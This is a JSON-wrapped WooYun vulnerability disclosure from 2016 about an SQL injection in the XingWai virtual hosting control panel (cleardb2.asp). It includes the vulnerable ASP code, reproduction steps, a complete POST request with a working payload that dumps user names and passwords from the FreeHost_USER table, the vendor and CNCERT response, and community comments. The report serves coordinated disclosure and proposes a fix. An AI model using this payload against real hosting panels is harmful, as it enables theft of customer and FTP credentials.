{"id": 88169, "wybug_id": "wooyun-2016-0188834", "wybug_title": "星外虚拟主机管理系统SQL注射漏洞                                      ", "wybug_corp": "广州星外信息科技有限公司", "wybug_author": "applychen", "wybug_date": "2016-03-25 10:50", "wybug_open_date": "2016-06-27 16:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-01：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-05-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-06-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-06-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-06-27：\t细节向公众公开  简要描述： 大家熟知的星外虚拟主机管理系统SQL注射，能查询库内所有的用户密码/虚拟主机/FTP等信息，影响广泛。 详细说明：  在/sqladm/cleardb2.asp文件中：\n<%If session(\"SqlAUID\")=\"\" Then\tef=True\tec=\"授权非法，有可能是超时造成的。\"ElseIf Request(\"id\")=\"\" Then\tef=True\tec=\"请输入产品ID！\"ElseIf Instr(1, Request(\"id\"), \"'\", 1)>0 then\tef=True\tec=\"非法产品ID！\"ElseIf not IsNumeric(Request(\"id\"))  Then\tef=True\tec=\"产品ID应该是数字！\"ElseIf Instr(1, session(\"username\"), \"'\", 1)>0 then\tef=True\tec=\"非法用户名！\"end ifif not ef thenSet conn=Server.CreateObject(\"ADODB.Connection\")\tconn.Open Application(\"FreeHostDBlink\")\tSet dsph = Server.CreateObject(\"ADODB.Recordset\")\t\tSql=\"Select * from FreeHost.FreeHost_Product_Sql where id='\"&session(\"SqlAUID\")&\"'\"\t\t\tif Instr(1,sql, \";\", 1)>0 or Instr(1,sql, \"--\", 1)>0 thenResponse.Write \"非法字符！\"Response.Endend if\tdsph.Open Sql,conn,1,3if dsph.Eof then\tef=True\tec=\"不存在的库ID！\"end ifend if…………for iipsec=1 to 2'response.write dsph(\"ip\"&iipsec)&iipsec&\"<br>\"if not isnull(dsph(\"ip\"&iipsec)) then\tSet dsphip = Server.CreateObject(\"ADODB.Recordset\")\t\tSql=\"Select * from FreeHost.FreeHost_Product_Sql where (ip1='\"&dsph(\"ip\"&iipsec)&\"' or ip2='\"&Request(\"ip\"&iipsec)&\"') and id<>'\"&dsph (\"id\")&\"'\"\t\t\tif Instr(1,sql, \";\", 1)>0 or Instr(1,sql, \"--\", 1)>0 thenResponse.Write \"非法字符！\"Response.Endend if\tdsphip.Open Sql,conn,1,3if dsphip.Eof then\n注意以下代码：\nSql=\"Select * from FreeHost.FreeHost_Product_Sql where (ip1='\"&dsph(\"ip\"&iipsec)&\"' or ip2='\"&Request(\"ip\"&iipsec)&\"') and id<>'\"&dsph (\"id\")&\"'\"\n可以看到Request(\"ip\"&iipsec)进行获取数据，即：\nRequest(ip1)Request(ip1)\n这里过滤了;（分号）以及--（注释符）就直接入库查询，造成SQL注射，注意这里还要满足一个IF条件：\nif not isnull(dsph(\"ip\"&iipsec)) then\ndsph(\"ip\"&iipsec)为从数据库中查询出的远程IP，在setip.asp中设置。下面进行以**.**.**.**为例进行测试，首先注册一个账户并登录，在左侧点击开通数据库。\n\n然后找一个能够免费试用进行实时开通（付费的测不起-_-）：\n\n开通成功后点击左侧的数据库管理：\n\n首先设置远程访问IP（满足IF条件）：\n\n然后点击清空数据库-->马上执行，不可恢复，抓取数据包：\n\n在POST数据中插入SQL注射的参数ip1或者ip2，完整数据包如下:\nPOST /sqladm/cleardb2.asp HTTP/1.1Host: **.**.**.**User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://**.**.**.**/sqladm/cleardb.asp?id=887Cookie: ASPSESSIONIDAABRQBQA=IEOJAHKBFLGOIKHEPHMACNCB; Hm_lvt_23f149cf9f1c205b13c96c4a43146e0b=1458834688; Hm_lpvt_23f149cf9f1c205b13c96c4a43146e0b=1458835916Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 208openX=%C2%ED%C9%CF%D6%B4%D0%D0%A3%AC%B2%BB%BF%C9%BB%D6%B8%B4&id=887&ip2=1')/**/and/**/(select/**/substring((select/**/username,password/**/from/**/FreeHost_USER/**/for/**/xml/**/auto),1,4000))=0/**/and('1'='1\n查询出登录账户以及密码：\n\n查询FTP账户密码登录IP：\n\n列几个受影响的站点：\nhttp://**.**.**.**/sqladm/cleardb2.asphttp://**.**.**.**/sqladm/cleardb2.asphttp://**.**.**.**/sqladm/cleardb2.asphttp://**.**.**.**/sqladm/cleardb2.asphttp://**.**.**.**/sqladm/cleardb2.asp\n   漏洞证明：  同上   修复方案：  过滤一下request('ip1')与request('ip2')   版权声明：转载请注明来源 applychen@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：13  确认时间：2016-03-29 16:49 厂商回复： CNVD确认所述情况,已经转由CNCERT下发给广东分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-25 10:53 |    \t\tkomas \t\t\t( 普通白帽子  |\t\t\t        Rank:107 漏洞数:25        )\t\t \n  这个危害就大了    \n     2016-03-25 10:56 |    \t\t数据流  \t\t\t( 普通白帽子  |\t\t\t        Rank:817 漏洞数:100        | 没关系啊，我们还有音乐)\t\t \n  星外呀 怀恋以前 ....    \n     2016-03-25 10:57 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  屌屌的陈老师    \n     2016-03-25 10:57 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  屌！    \n     2016-03-25 10:58 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1754 漏洞数:269        | 以大多数人的努力程度之低，根本轮不到去拼...)\t\t \n  简直6.    \n     2016-03-25 10:58 |    \t\tx7iao \t\t\t( 普通白帽子  |\t\t\t        Rank:395 漏洞数:56        | 文能床上控萝莉，武能床上定人妻)\t\t \n  卧槽 好6    \n     2016-03-25 10:58 |    \t\tJutaZ \t\t\t( 实习白帽子  |\t\t\t        Rank:95 漏洞数:14        | 少壮不努力老大徒伤悲)\t\t \n  6666    \n     2016-03-25 10:59 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:349 漏洞数:86        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  以前被星外搞得头痛，今天喜闻乐见    \n     2016-03-25 10:59 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:28        | 总感觉我会在哪天突然顿悟。)\t\t \n  必须占位    \n     2016-03-25 10:59 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  我去   本来还是白的  突然闪电加三刀    \n     2016-03-25 11:00 |    \t\t0x 80 \t\t\t( 普通白帽子  |\t\t\t        Rank:1864 漏洞数:509        | If we give enough, if we learn to trust ...)\t\t \n  围观    \n     2016-03-25 11:01 |    \t\tDloveJ \t\t\t( 普通白帽子  |\t\t\t        Rank:1427 漏洞数:255        | 专业潜水哒~)\t\t \n  66    \n     2016-03-25 11:01 |    \t\terhuo \t\t\t( 普通白帽子  |\t\t\t        Rank:164 漏洞数:39        | 666)\t\t \n  CCAV看这里！CCAV看这里！CCAV看这里！    \n     2016-03-25 11:03 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:265 漏洞数:33        | 开发真是日了狗了)\t\t \n  $$$$$$    \n     2016-03-25 11:10 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:99        | 哇啦啦啦啦啦 我的宝贝  |  Tr3jer@Gmail.c...)\t\t \n  6    \n     2016-03-25 11:11 |    \t\tXser \t\t\t( 普通白帽子  |\t\t\t        Rank:408 漏洞数:92        | JDSec)\t\t \n  牛逼啊    \n     2016-03-25 11:16 |    \t\t这只猪 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:6        | )(2009年荣获CCAV首届挖洞大使称号)(★★★...)\t\t \n  收藏    \n     2016-03-25 11:20 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:350 漏洞数:70        | ☁ 我要继续努力！)\t\t \n  留名    \n     2016-03-25 11:21 |    \t\tpudding2 \t\t\t( 普通白帽子  |\t\t\t        Rank:151 漏洞数:52        | 凡心所向，素履所往，生如逆旅，一苇以航)\t\t \n  膜拜大神    \n     2016-03-25 11:41 |    \t\t木易 \t\t\t( 普通白帽子  |\t\t\t        Rank:347 漏洞数:70        | 不，，不要误会，我不是针对谁，我是说在座...)\t\t \n  服    \n     2016-03-25 11:41 |    \t\t狼牙月 \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:14        | 水不撩怎知深浅 人不拼怎知输赢)\t\t \n  666666出口恶气    \n     2016-03-25 11:53 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:8        | 带我玩)\t\t \n  666666出口恶气     \n     2016-03-25 11:56 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:905 漏洞数:163        | raw_input(\"你知道我要输入什么？\"))\t\t \n  这个雷和刀  是我努力的方向啊    \n     2016-03-25 12:19 |    \t\thh2014 \t\t\t( 普通白帽子  |\t\t\t        Rank:1106 漏洞数:255        | )\t\t \n  666    \n     2016-03-25 12:24 |    \t\t糖剩七颗 \t\t\t( 普通白帽子  |\t\t\t        Rank:674 漏洞数:90        | 当几个月码农再出来冒泡！)\t\t \n  星外服务器满满的记忆啊    \n     2016-03-25 12:49 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:383 漏洞数:58        | 提莫队长正在待命！)\t\t \n  66    \n     2016-03-25 13:08 |    \t\tdiscovery \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:3        | www.google.com)\t\t \n  以前一个 xss 就搞定 好回忆啊.    \n     2016-03-25 13:13 |    \t\t10457793 \t\t\t( 普通白帽子  |\t\t\t        Rank:1063 漏洞数:170        | You are on my list!)\t\t \n  支付6乌云币查看POC    \n     2016-03-25 13:28 |    \t\tvon \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:8        | 一个帅字贯穿了我的一生~)\t\t \n  后排卖瓜~    \n     2016-03-25 13:34 |    \t\tautO_pw \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:25        | o_O``)\t\t \n  buff加满了没？    \n     2016-03-25 13:37 |    \t\t0h1in9e \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:23        | 林歌 | 峨眉山下修炼中的<网络安全></web开...)\t\t \n  漏洞标题后面的“乌云”和“$”符是什么意思哦？（小白初入乌云，……）    \n     2016-03-25 13:38 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1888 漏洞数:156        | 不要患得患失，我羡慕你，但是我还是选择做...)\t\t \n  @0h1in9e 精华漏洞 和人民币奖励的意思。    \n     2016-03-25 13:43 |    \t\tANS5 \t\t\t( 普通白帽子  |\t\t\t        Rank:349 漏洞数:107        | 此心安处是吾乡)\t\t \n  这样的三个$$$加个打雷  有多少钱？    \n     2016-03-25 13:47 |    \t\tMayter \t\t\t( 普通白帽子  |\t\t\t        Rank:165 漏洞数:40        | 笼鸡有食汤锅近，野鹤无粮天地宽.)\t\t \n  炫的不行    \n     2016-03-25 13:52 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:176 漏洞数:71        )\t\t \n  6    \n     2016-03-25 13:59 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:1597 漏洞数:386        | bye)\t\t \n  闪电没了    \n     2016-03-25 14:03 |    \t\tANS5 \t\t\t( 普通白帽子  |\t\t\t        Rank:349 漏洞数:107        | 此心安处是吾乡)\t\t \n  闪电没了     \n     2016-03-25 14:04 |    \t\t路人毛 \t\t\t( 普通白帽子  |\t\t\t        Rank:157 漏洞数:64        | 要想Rank给高，标题一定得屌)\t\t \n  电没了    \n     2016-03-25 14:14 |    \t\t继续沉默 \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:9        | 好好学习，天天向上)\t\t \n  好想艹翻星外啊    \n     2016-03-25 14:49 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:99        | 哇啦啦啦啦啦 我的宝贝  |  Tr3jer@Gmail.c...)\t\t \n  闪电呢？.。。    \n     2016-03-25 15:03 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:58        | 我是残废，啦啦啦啦)\t\t \n  后排膜拜陈老师    \n     2016-03-25 15:34 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:615 漏洞数:107        | 专心补刀。)\t\t \n  闪电没有了！    \n     2016-03-25 15:46 |    \t\tMr.li \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:36        | 爱萌妹子的骚年~)\t\t \n  咳咳    \n     2016-03-25 16:08 |    \t\t慢慢 \t\t\t( 普通白帽子  |\t\t\t        Rank:864 漏洞数:226        | 低调求发展)\t\t \n  闪电没有了？    \n     2016-03-25 16:11 |    \t\tGabriel \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:40        )\t\t \n  什么时候也能来三刀    \n     2016-03-25 16:35 |    \t\thuotoo \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        | 努力学习中)\t\t \n  这个屌啊     \n     2016-03-25 17:02 |    \t\timp0rt \t\t\t( 普通白帽子  |\t\t\t        Rank:117 漏洞数:54        | 。)\t\t \n  闪电呢。    \n     2016-03-25 17:04 |    \t\t小牛牛 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:17        | 求带)\t\t \n  6666666可以的，，    \n     2016-03-25 17:24 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  卧槽    \n     2016-03-25 18:33 |    \t\t带头大哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:879 漏洞数:258        | |任意邮件伪造| |目录遍历| |任意文件读取|...)\t\t \n  闪电呢,对得起陈老师么,要求加闪电,泼出去的水还收回去了~!~楼下你说呢！    \n     2016-03-25 21:25 |    \t\twatcher \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:6        | ~)\t\t \n  对啊，闪电本来有的，怎么撤回了。    \n     2016-03-25 21:36 |    \t\tSafe \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 一个平凡的人)\t\t \n  怎么厉害    \n     2016-03-25 22:54 |    \t\t0h1in9e \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:23        | 林歌 | 峨眉山下修炼中的<网络安全></web开...)\t\t \n  @小胖子 mark    \n     2016-03-26 08:40 |    \t\tsysALong \t\t\t( 普通白帽子  |\t\t\t        Rank:464 漏洞数:101        | 在我们黑龙江这噶哒，就没有什么事是【撸串...)\t\t \n  多余了，看我签名。    \n     2016-03-28 09:13 |    \t\tkevinchowsec \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:21        | 周凯文，信息安全爱好者。)\t\t \n  倒一堆虚拟机    \n     2016-03-28 16:56 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        )\t\t \n  @ANS5打雷是精华  刀是现金奖励 @0h1in9e 一刀应该是500吧      \n     2016-03-28 17:22 |    \t\t8点半 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 你当哥是CPU啊，人生价值就是执行指令?)\t\t \n  星外技术说是旧版本的- -    \n     2016-03-29 23:57 |    \t\tapplychen  \t\t\t( 普通白帽子  |\t\t\t        Rank:667 漏洞数:58        | 万古漫漫长如夜)\t\t \n  @8点半 测试的一个站最近的升级日期是2016-2-1同样存在此漏洞，另外闪电被取消是因为漏洞简单不够标准，最后吐槽一下这RANK实在是给低了。    \n     2016-03-30 16:27 |    \t\t8点半 \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:5        | 你当哥是CPU啊，人生价值就是执行指令?)\t\t \n  @applychen (┬＿┬)    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 13, "Ranks": null}